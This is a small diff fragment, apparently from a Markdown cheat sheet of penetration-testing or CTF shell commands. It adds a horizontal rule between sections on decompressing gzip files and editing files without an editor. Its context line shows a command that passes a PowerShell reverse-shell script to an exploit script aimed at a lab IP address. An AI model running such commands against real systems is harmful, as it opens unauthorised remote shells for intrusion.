@@ -54,6 +54,7 @@ python3 py.py 10.10.13.118 "$(cat revshell.ps1)"
 ```sh
 gzip -d file.gz
 ```
+---
 #### Change file without vim or nano
 ```sh
 cat > file << EOF 
